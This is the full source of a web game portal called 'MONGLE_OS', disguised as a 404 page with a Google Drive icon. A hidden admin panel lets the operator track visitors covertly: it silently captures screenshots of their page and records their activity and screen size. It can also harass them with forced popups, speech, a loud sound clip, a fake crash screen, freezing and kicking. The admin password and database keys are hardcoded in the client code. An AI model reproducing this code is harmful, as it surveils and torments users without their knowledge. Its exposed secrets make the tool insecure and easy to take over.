<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        /* Variables (Dynamic) */
        :root { --primary: #00ff41; --bg: #000; --card: #111; --err: #ff0000; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; transition: background 0.5s; }
        
        /* Hidden Admin Trigger */
        #ghostAdmin { position: fixed; top: 0; left: 0; width: 40px; height: 40px; z-index: 999999; cursor: crosshair; }

        /* Fake 404 & Freeze */
        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999999; display: none; flex-direction:column; align-items: center; justify-content: center; color: var(--primary); font-family: monospace; }
        
        /* Main Site */
        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
        .nav { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: rgba(255,255,255,0.05); border-bottom: 1px solid #333; }
        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
        .card { background: var(--card); border: 1px solid #333; padding: 30px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); transition: 0.2s; }
        .card:hover { border-color: var(--primary); background: #1a1a1a; transform: translateY(-3px); }

        /* V8 Admin Panel */
        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #080808; border: 2px solid #444; width: 95%; max-width: 1300px; height: 90vh; z-index: 3000000; border-radius: 12px; box-shadow: 0 0 100px #000; color: #fff; flex-direction: column; }
        .m-tabs { display: flex; background: #111; border-bottom: 1px solid #333; }
        .m-tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; color: #666; font-weight: bold; }
        .m-tab.active { color: var(--primary); background: #000; border-bottom: 2px solid var(--primary); }
        .m-content { flex-grow: 1; display: none; padding: 20px; gap: 20px; overflow: hidden; }
        .m-content.active { display: flex; }

        /* Sidebar & Target Info */
        .col-u { width: 300px; background: #050505; border: 1px solid #333; overflow-y: auto; }
        .u-item { padding: 12px; border-bottom: 1px solid #222; cursor: pointer; }
        .u-item.selected { background: #111; border-left: 5px solid var(--primary); color: var(--primary); }
        .col-v { flex-grow: 1; display: flex; flex-direction: column; gap: 15px; }

        /* The Monitor */
        #monitor { height: 400px; background: #000; border: 1px solid #333; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        #mon-view { max-width: 100%; max-height: 100%; }

        .btn-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; }
        .btn { background: #222; color: var(--primary); border: 1px solid #444; padding: 12px; cursor: pointer; font-size: 11px; font-weight: bold; }
        .btn:hover { background: var(--primary); color: #000; }
        .btn-red { border-color: var(--err); color: var(--err); }
        .btn-red:hover { background: var(--err); color: #fff; }

        /* Clock in Admin */
        #adminClock { position: absolute; right: 20px; top: 12px; color: #666; font-family: monospace; }
    </style>
</head>
<body>

    <div id="ghostAdmin" onclick="openAdmin()"></div>
    <div id="lockdown"><h1>404</h1><p>File Not Found</p></div>
    <div id="freeze"><h1>SYSTEM LOCKED</h1><p>Contact Administrator</p></div>

    <div id="loginOverlay" style="position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:1500000; display:none; align-items:center; justify-content:center;">
        <div style="background:#111; padding:40px; border:1px solid #333; text-align:center;">
            <h2 id="loginTitle" style="color:var(--primary);">IDENTITY REQUIRED</h2>
            <input type="text" id="username" style="padding:10px; background:#000; border:1px solid #444; color:#fff; width:200px;" placeholder="Name...">
            <button class="btn" style="display:block; width:100%; margin-top:10px;" onclick="initSession()">ENTER</button>
        </div>
    </div>

    <div id="app">
        <div class="nav">
            <div id="siteBrand" style="font-size:24px; font-weight:bold;">MONGLE_OS</div>
            <div style="display:flex; gap:10px;">
                <button id="adminBtn" class="btn" style="display:none;" onclick="toggleModal()">ADMIN PANEL</button>
                <button class="btn btn-red" onclick="window.location.replace('https://google.com')">PANIC</button>
            </div>
        </div>
        <div id="grid" class="game-grid"></div>
    </div>

    <div id="adminM" class="modal">
        <div class="m-tabs">
            <div class="m-tab active" onclick="setTab(0)">üë• USER WATCH</div>
            <div class="m-tab" onclick="setTab(1)">‚öôÔ∏è SYSTEM CONTROL</div>
            <div id="adminClock">00:00:00</div>
        </div>

        <div id="t0" class="m-content active">
            <div id="userList" class="col-u"></div>
            <div class="col-v">
                <div id="monitor">
                    <img id="mon-view" src="">
                    <div id="mon-stats" style="position:absolute; bottom:10px; left:10px; background:rgba(0,0,0,0.8); padding:5px; font-size:12px;">No Target...</div>
                </div>
                <div class="btn-grid">
                    <button class="btn" onclick="act('capReq')">üì∏ SNAP</button>
                    <button class="btn" onclick="act('recReq')">üé• REC 5s</button>
                    <button class="btn" onclick="act('gpsReq')">üìç GEOLOCATE</button>
                    <button class="btn btn-red" onclick="act('skeleton')">üíÄ SKELETON BOMB</button>
                    <button class="btn btn-red" onclick="act('freeze')">‚ùÑÔ∏è FREEZE</button>
                    <button class="btn btn-red" onclick="act('kicked')">üö´ KICK</button>
                </div>
                <div class="btn-grid">
                    <button class="btn" onclick="custom('msg')">üí¨ POPUP</button>
                    <button class="btn" onclick="custom('speak')">üó£Ô∏è TTS</button>
                    <button class="btn" onclick="custom('bg')">üñºÔ∏è WALLPAPER</button>
                    <button class="btn" onclick="act('invert')">üåó INVERT</button>
                    <button class="btn" onclick="act('shake')">üì≥ SHAKE</button>
                    <button class="btn btn-red" onclick="act('bsod')">‚ò†Ô∏è CRASH</button>
                </div>
            </div>
        </div>

        <div id="t1" class="m-content">
            <div style="width:100%; max-width:600px; margin:0 auto;">
                <h3>Global Customization</h3>
                <label>Site Name:</label><br>
                <input type="text" id="inpName" style="width:100%; padding:10px; background:#111; border:1px solid #444; color:#fff;"><br><br>
                <label>Theme Color:</label><br>
                <input type="color" id="inpColor" style="width:100%; height:50px; background:none; border:none; cursor:pointer;"><br><br>
                <button class="btn" style="width:100%" onclick="saveGlobal()">APPLY CHANGES TO ALL USERS</button>
                <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
                <button class="btn btn-red" style="width:100%" onclick="clearDB()">WIPE ALL USER DATA</button>
            </div>
        </div>
        <div style="padding:10px; text-align:right;"><button class="btn btn-red" onclick="toggleModal()">CLOSE PANEL</button></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // --- üîê CONFIG ---
        const ADMIN_PASS = "balls"; // CHANGE THIS EASILY
        const CFG = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
        
        const app = initializeApp(CFG);
        const db = getDatabase(app);
        let userRef, myID, selectedID, isAdmin = false, gameData = [];

        // Global Sync
        onValue(ref(db, 'globals'), s => {
            const g = s.val(); if(!g) return;
            document.getElementById('siteBrand').innerText = g.name;
            document.title = g.name;
            document.documentElement.style.setProperty('--primary', g.color);
        });

        window.openAdmin = () => { if(prompt("ACCESS CODE:")===ADMIN_PASS){ isAdmin=true; document.getElementById('adminBtn').style.display='block'; initSession(); toggleModal(); } };
        
        window.initSession = async () => {
            const n = document.getElementById('username').value || "Guest";
            document.getElementById('lockdown').style.display="none"; 
            document.getElementById('loginOverlay').style.display="none"; 
            document.getElementById('app').style.display="flex";

            userRef = push(ref(db, 'presence'), { name: n, activity: 'Browsing Menu', res: `${screen.width}x${screen.height}`, joined: Date.now() });
            myID = userRef.key;
            onDisconnect(userRef).remove(); // REMOVES FROM ADMIN LIST ON TAB CLOSE

            onValue(ref(db, `presence/${myID}`), s => {
                const d = s.val(); if(!d) return;
                if(d.kicked) window.location.href="https://google.com";
                if(d.bsod) document.body.innerHTML="<div style='background:blue;height:100vh;color:white;padding:100px;'>:( PC_RAN_INTO_PROBLEM</div>";
                document.getElementById('freeze').style.display = d.freeze ? 'flex' : 'none';
                if(d.msg) { alert(d.msg); update(userRef,{msg:null}); }
                if(d.speak) { const u=new SpeechSynthesisUtterance(d.speak); window.speechSynthesis.speak(u); update(userRef,{speak:null}); }
                if(d.invert) document.body.style.filter = document.body.style.filter==='invert(1)'?'none':'invert(1)';
                if(d.bg) { document.getElementById('app').style.backgroundImage = `url(${d.bg})`; update(userRef,{bg:null}); }
                if(d.skeleton) { 
                    const a = new Audio('https://www.myinstants.com/media/sounds/spooky-scary-skeletons-remix.mp3'); 
                    a.volume = 1; a.play(); update(userRef,{skeleton:false});
                }
                if(d.capReq) html2canvas(document.body).then(c=>update(userRef,{lastCap:c.toDataURL("image/webp",0.2),capReq:false}));
            });

            const r = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
            gameData = (await r.json()).filter(f=>f.name.endsWith('.html')&&f.name!=='index.html');
            renderGrid();
            if(isAdmin) startOverseer();
        };

        window.renderGrid = () => {
            const g = document.getElementById('grid'); g.innerHTML="";
            gameData.forEach(game => {
                const c = document.createElement('div'); c.className="card";
                c.innerHTML=`<b>${game.name.replace('.html','')}</b>`;
                c.onclick = () => {
                    update(userRef, { activity: `Playing: ${game.name}` });
                    window.open(`https://raw.githack.com/bob154526-hue/Mongle/main/${game.name}`, '_blank');
                };
                g.appendChild(c);
            });
        };

        /* ADMIN CONTROL */
        function startOverseer() {
            onValue(ref(db, 'presence'), s => {
                const l = document.getElementById('userList'); l.innerHTML="";
                s.forEach(c => {
                    const u = c.val();
                    const d = document.createElement('div'); d.className = `u-item ${selectedID===c.key?'selected':''}`;
                    d.innerHTML = `<b>${u.name}</b><br><small>${u.activity}</small>`;
                    d.onclick = () => { selectedID = c.key; updateMon(u); };
                    l.appendChild(d);
                    if(selectedID===c.key) updateMon(u);
                });
            });
            setInterval(() => { document.getElementById('adminClock').innerText = new Date().toLocaleTimeString(); }, 1000);
        }

        function updateMon(u) {
            document.getElementById('mon-view').src = u.lastCap || "";
            document.getElementById('mon-stats').innerHTML = `TARGET: ${u.name} | ACT: ${u.activity} | RES: ${u.res}`;
        }

        window.setTab = (n) => {
            document.querySelectorAll('.m-tab').forEach((t,i)=>t.className=i===n?'m-tab active':'m-tab');
            document.querySelectorAll('.m-content').forEach((c,i)=>c.className=i===n?'m-content active':'m-content');
        };

        window.act = (k) => { if(selectedID) update(ref(db,`presence/${selectedID}`), {[k]: true}); };
        window.custom = (k) => { if(selectedID) update(ref(db,`presence/${selectedID}`), {[k]: prompt("Value:")}); };
        window.toggleModal = () => { const m=document.getElementById('adminM'); m.style.display=m.style.display==='flex'?'none':'flex'; };
        window.saveGlobal = () => { update(ref(db, 'globals'), { name: document.getElementById('inpName').value, color: document.getElementById('inpColor').value }); };
        window.clearDB = () => remove(ref(db, 'presence'));
    </script>
</body>
</html>
